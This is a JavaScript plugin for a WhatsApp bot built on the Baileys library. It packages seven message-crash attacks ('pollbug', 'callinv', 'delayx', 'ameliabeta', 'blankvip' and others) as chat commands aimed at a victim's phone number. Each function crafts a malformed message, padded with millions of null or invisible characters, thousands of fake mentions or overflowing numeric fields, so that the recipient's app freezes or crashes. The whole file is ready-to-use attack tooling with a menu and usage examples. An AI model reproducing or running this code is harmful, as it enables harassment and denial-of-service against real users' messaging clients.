const { cmd } = require('../command');
const crypto = require('crypto');
let { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
// fallback for different Baileys versions
if (!generateWAMessageFromContent) {
    try { generateWAMessageFromContent = require('@adiwajshing/baileys').generateWAMessageFromContent; } catch(e) {}
}

// Helper: sleep
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Optional: colored console (if chalk not installed, ignore)
let chalk;
try { chalk = require('chalk'); } catch(e) { chalk = { red: (t)=>t, green: (t)=>t, bold: (t)=>t }; }

// ==================== UTILITIES ====================
function formatTarget(args, from, reply) {
    if (!args[0]) {
        reply(`❌ *Missing target number!*\n\nUsage: .${args.cmd} 947XXXXXXXXX\nExample: .${args.cmd} 94712345678`);
        return null;
    }
    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
}

// ==================== CRASH FUNCTIONS (CLEANED & FIXED) ====================

// 1. callinvisible (from #callinvisible.js)
async function callinvisible(sock, target) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "@rizxvelzdev", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                },
                contextInfo: {
                    participant: { jid: target },
                    mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
                    ]
                }
            }
        }
    }, {});
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta", attrs: {}, content: [{
                tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });
}

// 2. DelayInvisibleXx (fixed)
async function DelayInvisibleXx(sock, target) {
    const mentioned = Array.from({ length: 10 }, () => "0@s.whatsapp.net");
    const invisibleChar = '\u2063';
    const longText = invisibleChar.repeat(500000) + "@0".repeat(50000);
    const payload = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: { locationMessage: { degreesLatitude: 9999, degreesLongitude: 9999 }, hasMediaAttachment: true },
                    body: { text: longText },
                    nativeFlowMessage: {},
                    contextInfo: { mentionedJid: mentioned }
                },
                groupStatusMentionMessage: {
                    groupJid: target,
                    mentionedJid: mentioned,
                    contextInfo: { mentionedJid: mentioned }
                }
            }
        }
    };
    await sock.relayMessage(target, payload, { participant: { jid: target } });
}

// 3. delay2 (from delayhardNew.js – simplified but powerful)
async function delay2(sock, target) {
    const mentionedJid = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ];
    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Amelia Modders",
                    listType: 2,
                    sections: [],
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Amelia Modders"
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, MSG, {});
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta", attrs: {}, content: [{
                tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });
}

// 4. AmeliaBeta (from delayBeta.js – ultra powerful)
async function AmeliaBeta(sock, target) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ];
    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "Amelia Send Bug" + "ោ៝".repeat(10000),
        title: "Amelia Modders",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/J.oxyy",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };
    const videoMsg = {
        videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/545780153_1768068347247055_8008910110610321588_n.enc?ccb=11-4&oh=01_Q5Aa2gF45pi45HoFCrDj40WuGbf2qvyU6K3wubsygX5Y_AnGmw&oe=68E66184&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "EY0PNB4nOae0b9/f+tNPB99rJSmJZ/Ns2SEfu7Jc8wI=",
            fileLength: "2534607",
            seconds: 8,
            mediaKey: "YDQMBzXkapRZjXrPVAr2CwEPIBnv6aDHHQLaEYLOPyE=",
            height: 1280,
            width: 720,
            fileEncSha256: "XcTQbrJvO9ICWDBnW8710Ow4QLbygfTUYzP3l0rg0no=",
            directPath: "/v/t62.7161-24/545780153_1768068347247055_8008910110610321588_n.enc?ccb=11-4&oh=01_Q5Aa2gF45pi45HoFCrDj40WuGbf2qvyU6K3wubsygX5Y_AnGmw&oe=68E66184&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1757337021",
            jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z", "base64"),
            contextInfo: { isSampled: true, mentionedJid: mentionedList },
            forwardedNewsletterMessageInfo: { newsletterJid: "120363321780343299@newsletter", serverMessageId: 1, newsletterName: "Amelia Send Bug" },
            annotations: [{ embeddedContent: { embeddedMusic }, embeddedAction: true }]
        }
    };
    const stickerMsg = {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                    mimetype: "image/webp",
                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                    fileLength: { low: 1, high: 0, unsigned: true },
                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                    firstFrameLength: 19904,
                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                    isAnimated: true,
                    contextInfo: { mentionedJid: ["13135550002@s.whatsapp.net"], groupMentions: [], entryPointConversionSource: "non_contact", entryPointConversionApp: "whatsapp", entryPointConversionDelaySeconds: 467593 },
                    stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
                    isAvatar: true,
                    isAiSticker: true,
                    isLottie: true
                }
            }
        }
    };
    const interactiveMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "Amelia Send Delay", format: "DEFAULT" },
                    nativeFlowResponseMessage: { name: "call_permission_request", paramsJson: "\x10".repeat(1045000), version: 3 },
                    entryPointConversionSource: "galaxy_message"
                }
            }
        }
    }, { ephemeralExpiration: 0, forwardingScore: 9741, isForwarded: true, font: Math.floor(Math.random() * 99999999), background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "999999") });
    
    await sock.relayMessage("status@broadcast", interactiveMsg.message, { messageId: interactiveMsg.key.id, statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
    await sleep(1000);
    await sock.relayMessage("status@broadcast", videoMsg, { messageId: "AmeliaBeta-" + Date.now(), statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
    await sleep(1000);
    await sock.relayMessage("status@broadcast", stickerMsg, { messageId: "Sticker-" + Date.now(), statusJidList: [target] });
    console.log(chalk.red(`✓ AmeliaBeta sent to ${target}`));
}

// 5. BlankVVIP (from crash new.js – fixed)
async function BlankVVIP(sock, target) {
    const MSG = {
        groupInviteMessage: {
            groupJid: "120363370626418572@g.us",
            inviteCode: "Xx".repeat(10000),
            inviteExpiration: "99999999999",
            groupName: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌" + "ោ៝".repeat(77777),
            caption: "ោ៝".repeat(10000) + "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000) + "._.*_*._>".repeat(5000),
            contentText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000),
            displayText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000),
            contextInfo: {
                expiration: 1,
                ephemeralSettingTimestamp: 1,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 1,
                disappearingMode: { initiatorDeviceJid: target, initiator: "INITIATED_BY_OTHER", trigger: "UNKNOWN_GROUPS" },
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: "0@s.whatsapp.net",
                questionMessage: { paymentInviteMessage: { serviceType: 1, expiryTimestamp: null } },
                externalAdReply: { showAdAttribution: false, renderLargerThumbnail: true }
            },
            body: { text: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌" + "ោ៝".repeat(10450) + "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(32901) + "@1".repeat(50000) },
            footer: { text: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(5000) },
            nativeFlowMessage: { messageParamJson: "{".repeat(25000) },
            buttons: [
                { name: "cta_url", buttonParamJson: "\u0000".repeat(25000) },
                { name: "cta_url", buttonParamJson: JSON.stringify({ displayText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000) }) },
                { name: "cta_call", buttonParamJson: JSON.stringify({ displayText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(5000) }) },
                { name: "cta_copy", buttonParamJson: "\u0000".repeat(25000) }
            ]
        }
    };
    await sock.relayMessage(target, MSG, { participant: { jid: target } });
    console.log(chalk.bold.red(`[BlankVVIP] Sent to ${target}`));
}

// 6. original poll bug (fixed)
async function xlmnop(sock, target) {
    const pollMsg = {
        pollCreationMessage: {
            name: "⚠️ SYSTEM OVERFLOW ⚠️",
            options: [{ optionName: "⛔" + "0".repeat(50000) }, { optionName: "💀" + "0".repeat(50000) }],
            selectableOptionsCount: 1,
            pollType: "QUIZ",
            correctAnswer: { optionName: "💀" + "0".repeat(50000) },
            contextInfo: { isGroupStatus: false }
        }
    };
    const msg = generateWAMessageFromContent(target, pollMsg, {});
    await sock.relayMessage(target, msg.message, {});
}

// 7. original viewOnce bug (fixed)
async function ttaas(sock, target) {
    const imageMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
        fileLength: "93217",
        caption: "7eppsynC",
        height: 1080,
        width: 1080,
        mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
        fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
        directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1778142659",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
        contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA", isQuestion: true, isGroupStatus: true },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        firstScanLength: 9999999999999999999,
        scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
        midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
    };
    const viewOnceMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                productMessage: {
                    product: {
                        productImage: imageMessage,
                        productId: "449756950375071",
                        title: "7eppsynC",
                        description: "",
                        priceAmount1000: { low: 999, high: 0, unsigned: false },
                        url: "wa.me/status",
                        productImageCount: 9999999,
                        firstImageId: "9999999999",
                        salePriceAmount1000: { low: 9999999, high: 999999999, unsigned: true }
                    },
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                }
            }
        }
    }, {});
    await sock.relayMessage(target, viewOnceMsg.message, {});
}

// ==================== COMMANDS ====================

cmd({ pattern: "pollbug", desc: "Poll crash (fixed)", category: "tools", filename: __filename },
async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = formatTarget(args, from, reply);
    if (!target) return;
    await reply(`🔥 *POLL CRASH* → ${target}`);
    await xlmnop(conn, target);
    await reply(`✅ POLL CRASH SENT to ${target}`);
});

cmd({ pattern: "bug", desc: "ViewOnce product crash", category: "tools", filename: __filename },
async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = formatTarget(args, from, reply);
    if (!target) return;
    await reply(`📸 *VIEWONCE CRASH* → ${target}`);
    await ttaas(conn, target);
    await reply(`✅ VIEWONCE CRASH SENT to ${target}`);
});

cmd({ pattern: "callinv", desc: "Call permission crash", category: "tools", filename: __filename },
async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = formatTarget(args, from, reply);
    if (!target) return;
    await reply(`📞 *CALL INVISIBLE* → ${target}`);
    await callinvisible(conn, target);
    await reply(`✅ CALL INVISIBLE SENT to ${target}`);
});

cmd({ pattern: "delayx", desc: "Invisible delay crash (ephemeral)", category: "tools", filename: __filename },
async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = formatTarget(args, from, reply);
    if (!target) return;
    await reply(`🌀 *DELAY INVISIBLE* → ${target}`);
    await DelayInvisibleXx(conn, target);
    await reply(`✅ DELAY INVISIBLE SENT to ${target}`);
});

cmd({ pattern: "delay2", desc: "List response crash", category: "tools", filename: __filename },
async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = formatTarget(args, from, reply);
    if (!target) return;
    await reply(`📋 *DELAY2 CRASH* → ${target}`);
    await delay2(conn, target);
    await reply(`✅ DELAY2 CRASH SENT to ${target}`);
});

cmd({ pattern: "ameliabeta", desc: "Ultra power (video+sticker+flow)", category: "tools", filename: __filename },
async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = formatTarget(args, from, reply);
    if (!target) return;
    await reply(`💎 *AMELIA BETA* → ${target}\n_This may take a few seconds_`);
    await AmeliaBeta(conn, target);
    await reply(`✅ AMELIA BETA COMPLETED → ${target}`);
});

cmd({ pattern: "blankvip", desc: "Group invite overflow crash", category: "tools", filename: __filename },
async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = formatTarget(args, from, reply);
    if (!target) return;
    await reply(`👑 *BLANK VIP* → ${target}`);
    await BlankVVIP(conn, target);
    await reply(`✅ BLANK VIP SENT to ${target}`);
});

// ==================== BUG MENU ====================
cmd({ pattern: "bugmenu", desc: "Show all crash commands", category: "tools", filename: __filename },
async (conn, mek, m, { from, pushname, sender, reply }) => {
    const menu = `
╔══════════════════════════╗
║      🔥 *BUG MENU* 🔥      ║
╠══════════════════════════╣
║ 📌 .pollbug 947XXXXXXXX   ║
║    └─ Poll crash (fixed)  ║
║ 📌 .bug 947XXXXXXXX       ║
║    └─ ViewOnce product    ║
║ 📌 .callinv 947XXXXXXXX   ║
║    └─ Call permission     ║
║ 📌 .delayx 947XXXXXXXX    ║
║    └─ Invisible delay     ║
║ 📌 .delay2 947XXXXXXXX    ║
║    └─ List response       ║
║ 📌 .ameliabeta 947XXXXXXX ║
║    └─ Ultra video+sticker ║
║ 📌 .blankvip 947XXXXXXXX  ║
║    └─ Group invite overflow║
╚══════════════════════════╝
💡 *Usage:* command + target number
📌 *Example:* .pollbug 94712345678
⚠️ *Use responsibly!*
    `;
    await reply(menu);
});
